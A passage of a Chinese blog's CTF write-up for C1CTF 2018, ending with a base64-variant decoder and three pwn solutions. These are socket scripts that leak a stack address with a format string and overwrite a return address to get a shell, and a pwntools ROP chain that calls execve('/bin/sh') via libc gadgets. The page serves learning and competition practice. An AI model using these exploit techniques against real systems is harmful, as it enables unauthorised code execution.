class="comment">//取出v7中剩余的位数, v5位</span></span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">5u</span> ) <span class="comment">// 不足五位向前取一位</span></span><br><span class="line">      ++v7;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v3;</span><br><span class="line">  *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看出这是base64, 反向编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">'nopqrstuvwxyzabcdefghijklm0123456789ABCDEFGHIJKL+/MNOPQRSTUVWXYZ'</span></span><br><span class="line">s = <span class="string">'KFjUWyZ592NvPU1CCa5xAIRVAa4CTEN6+bjwWlqm'</span></span><br><span class="line">a = <span class="string">''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">    i = t.find(ch)</span><br><span class="line">    a += <span class="string">'&#123;0:0&gt;6b&#125;'</span>.format(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i/<span class="number">8</span> % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flag += chr(int(a[i:i+<span class="number">8</span>],base=<span class="number">2</span>) ^ <span class="number">0xF9</span> )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(int(a[i:i+<span class="number">8</span>],base=<span class="number">2</span>) ^ <span class="number">0xA4</span> )</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#C1CTF&#123;th1s_Bas364_is_BuD9ApUy&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x05-Activate"><a href="#0x05-Activate" class="headerlink" title="0x05 Activate"></a>0x05 Activate</h3><p>UTF16编码：</p>
<p><code>激活码无效</code> -&gt; <code>C0 6F 3B 6D 01 78 E0 65 48 65</code></p>
<p>找到激活码无效这一字符串前面的分支, 下个断点</p>
<p>走红线 “激活完成”</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="0x01-Chekin"><a href="#0x01-Chekin" class="headerlink" title="0x01 Chekin"></a>0x01 Chekin</h3><p>这其实算密码学题目吧….   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((<span class="string">"your ip address"</span>,<span class="number">9990</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'2'</span>+<span class="string">b'\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">payload = <span class="string">b'10'</span>+<span class="string">b'\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">payload = <span class="string">b'3544388184383369539\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">print(sock.recv(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'2'</span>+<span class="string">b'\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">payload = <span class="string">b'11'</span>+<span class="string">b'\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">payload = <span class="string">b'56\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">print(sock.recv(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'0'</span>+<span class="string">b'\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">print(sock.recv(<span class="number">100</span>))</span><br><span class="line">print(sock.recv(<span class="number">100</span>))</span><br><span class="line">print(sock.recv(<span class="number">100</span>))</span><br></pre></td></tr></table></figure>

<h3 id="0x02-Windows"><a href="#0x02-Windows" class="headerlink" title="0x02 Windows"></a>0x02 Windows</h3><p>主要是调用 <code>00402360</code> 处的后门</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span>  </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">    s.connect((<span class="string">"your ip address"</span>,<span class="number">9990</span>))  </span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="comment"># 选择写入内容</span></span><br><span class="line">    payload = <span class="string">b'1'</span></span><br><span class="line">    <span class="comment"># 向服务器发送数据  </span></span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(s.recv(<span class="number">2048</span>))</span><br><span class="line">    <span class="comment"># 写入字符串%p</span></span><br><span class="line">    payload = <span class="string">b'%p'</span></span><br><span class="line">    </span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="comment"># 读取地址%p</span></span><br><span class="line">    payload = <span class="string">b'2'</span></span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment">#'Here is your string:\r\n00D72230'</span></span><br><span class="line">    r = s.recv(<span class="number">1024</span>).decode(<span class="string">'gbk'</span>)</span><br><span class="line">    print(r)</span><br><span class="line">    <span class="comment"># 选择写入</span></span><br><span class="line">    payload = <span class="string">b'1'</span></span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'gbk'</span>))</span><br><span class="line">    <span class="comment"># 写入Payload 覆盖返回值, 获取shell</span></span><br><span class="line">    payload = <span class="string">b'A'</span>*<span class="number">20</span>+(int(r[<span class="number">-8</span>:],base=<span class="number">16</span>)+<span class="number">176</span>).to_bytes(<span class="number">4</span>,<span class="string">'little'</span>)</span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'gbk'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b'type flag.txt'</span></span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(s.recv(<span class="number">2048</span>).decode(<span class="string">'gbk'</span>))</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

<h3 id="0x03-upgrade"><a href="#0x03-upgrade" class="headerlink" title="0x03 upgrade"></a>0x03 upgrade</h3><p>直接看脚本的注释或者看线下的解释吧…  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'1\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line">p.send(<span class="string">'15\n'</span>)</span><br><span class="line"><span class="comment">#print(p.recv())</span></span><br><span class="line">t = p.recv()</span><br><span class="line">print(t)</span><br><span class="line">libc_main_ret = [int(s) <span class="keyword">for</span> s <span class="keyword">in</span> t.split() <span class="keyword">if</span> s.isdigit()][<span class="number">0</span>]</span><br><span class="line">print(libc_main_ret)</span><br><span class="line"></span><br><span class="line">libc_main_base = libc_main_ret - <span class="number">0x021B97</span></span><br><span class="line"></span><br><span class="line">libc_pop_rdi = libc_main_base + <span class="number">0x02155f</span> </span><br><span class="line">libc_pop_rdx_rsi = libc_main_base + <span class="number">0x01306d9</span></span><br><span class="line"></span><br><span class="line">libc_bin_sh = libc_main_base + <span class="number">0x01b3e9a</span></span><br><span class="line">libc_int_80 = libc_main_base + <span class="number">0x01b3e9a</span></span><br><span class="line">libc_execve =  libc_main_base + <span class="number">0xE4E30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x000000000002155f : pop rdi ; ret A</span></span><br><span class="line"><span class="comment">#0x0000000000023e6a : pop rsi ; ret B</span></span><br><span class="line"><span class="comment">#0x0000000000001b96 : pop rdx ; ret C</span></span><br><span class="line"><span class="comment">#0x000000000003eb0b : pop rcx ; ret D</span></span><br><span class="line"><span class="comment">#0x00000000001306d9 : pop rdx ; pop rsi ; ret</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n15\n'</span>)</span><br><span class="line">p.send(str(libc_pop_rdi)+<span class="string">'\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n16\n'</span>)</span><br><span class="line">p.send(str(libc_bin_sh)+<span class="string">'\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n17\n'</span>)</span><br><span class="line">p.send(str(libc_pop_rdx_rsi)+<span class="string">'\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n18\n'</span>)</span><br><span class="line">p.send(<span class="string">'0\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n19\n'</span>)</span><br><span class="line">p.send(<span class="string">'0\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n20\n'</span>)</span><br><span class="line">p.send(str(libc_execve)+<span class="string">'\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'0\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>rmb122
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://rmb122.com/2018/12/12/c1ctf-2018-writeup/" title="C1CTF 2018 Writeup">https://rmb122.com/2018/12/12/c1ctf-2018-writeup/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章仅仅记录学习过程, 并不保证文章完全正确, 如果你有任何疑问或者找出问题, 欢迎在评论区指正.
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/writeup/" rel="tag"># writeup</a>
              <a href="/tags/c1ctf/" rel="tag"># c1ctf</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2018/11/30/%E5%9C%A8%20ArchLinux%20%E4%B8%8A%E5%AE%89%E8%A3%85%20LAMP/" rel="prev" title="在 ArchLinux 上安装 LAMP">
      <i class="fa fa-chevron-left"></i> 在 ArchLinux 上安装 LAMP
    </a></div>
      <div class="post-nav-item">
    <a href="/2019/01/04/PHP%20%E6%94%AF%E6%8C%81%E7%9A%84%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/" rel="next" title="PHP 支持的各种协议学习">
      PHP 支持的各种协议学习 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-签到"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-find-the-flag"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 find the flag~</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-cats-and-dogs"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 cats and dogs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-easy-crypto"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 easy_crypto</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-resize-your-image"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 resize your image</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-web签到"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 web签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-php是世界上最好的语言"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 php是世界上最好的语言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-今年还有小姐姐"><span class="nav-number">2.4.</span> <span class="nav-text">0x04 今年还有小姐姐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-eeeee"><span class="nav-number">2.5.</span> <span class="nav-text">0x05 eeeee</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-baby-exec"><span class="nav-number">2.6.</span> <span class="nav-text">0x06 baby exec</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reserve"><span class="nav-number">3.</span> <span class="nav-text">Reserve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-iOS13"><span class="nav-number">3.1.</span> <span class="nav-text">0x01 iOS13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Captcha"><span class="nav-number">3.2.</span> <span class="nav-text">0x02 Captcha</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Adjacent"><span class="nav-number">3.3.</span> <span class="nav-text">0x03 Adjacent</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-encoding"><span class="nav-number">3.4.</span> <span class="nav-text">0x04 encoding</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-Activate"><span class="nav-number">3.5.</span> <span class="nav-text">0x05 Activate</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">4.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Chekin"><span class="nav-number">4.1.</span> <span class="nav-text">0x01 Chekin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Windows"><span class="nav-number">4.2.</span> <span class="nav-text">0x02 Windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-upgrade"><span class="nav-number">4.3.</span> <span class="nav-text">0x03 upgrade</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="rmb122"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">rmb122</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">67</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/rmb122" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rmb122" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rmb122</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

        






<script>
  (function() {
    function leancloudSelector(url) {
      url = encodeURI(url);
      return document.getElementById(url).querySelector('.leancloud-visitors-count');
    }

    function addCount(Counter) {
      var visitors = document.querySelector('.leancloud_visitors');
      var url = decodeURI(visitors.id);
      var title = visitors.dataset.flagTitle;

      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length > 0) {
            var counter = results[0];
            leancloudSelector(url).innerText = counter.time + 1;
            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
              .catch(error => {
                console.error('Failed to save visitor count', error);
              });
          } else {
              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
            
          }
        })
        .catch(error => {
          console.error('LeanCloud Counter Error', error);
        });
    }

    function showTime(Counter) {
      var visitors = document.querySelectorAll('.leancloud_visitors');
      var entries = [...visitors].map(element => {
        return decodeURI(element.id);
      });

      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
        .then(response => response.json())
        .then(({ results }) => {
          for (let url of entries) {
            let target = results.find(item => item.url === url);
            leancloudSelector(url).innerText = target ? target.time : 0;
          }
        })
        .catch(error => {
          console.error('LeanCloud Counter Error', error);
        });
    }

    let { app_id, app_key, server_url } = {"enable":true,"app_id":"rVVd10sU0t2cjpEvSiQh7av7-MdYXbMMI","app_key":"Y31jyHHMWPckrz1X8Fn9EUi0","server_url":null,"security":true};
    function fetchData(api_server) {
      var Counter = (method, url, data) => {
        return fetch(`${api_server}/1.1${url}`, {
          method,
          headers: {
            'X-LC-Id'     : app_id,
            'X-LC-Key'    : app_key,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      if (CONFIG.page.isPost) {
        if (CONFIG.hostname !== location.hostname) return;
        addCount(Counter);
      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
        showTime(Counter);
      }
    }

    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;

    if (api_server) {
      fetchData(api_server);
    } else {
      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
        .then(response => response.json())
        .then(({ api_server }) => {
          fetchData('https://' + api_server);
        });
    }
  })();
</script>


      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>

<script src="/js/utils.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el         : '#valine-comments',
      path       : location.pathname,
    }, {"enable":true,"appId":"rVVd10sU0t2cjpEvSiQh7av7-MdYXbMMI","appKey":"Y31jyHHMWPckrz1X8Fn9EUi0","notify":false,"verify":true,"placeholder":"Write something here","avatar":"retro","meta":["nick","mail"],"pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":"https://rvvd10su.api.lncldglobal.com"}
    ));
  }, window.Valine);
});
</script>

</body>
</html>
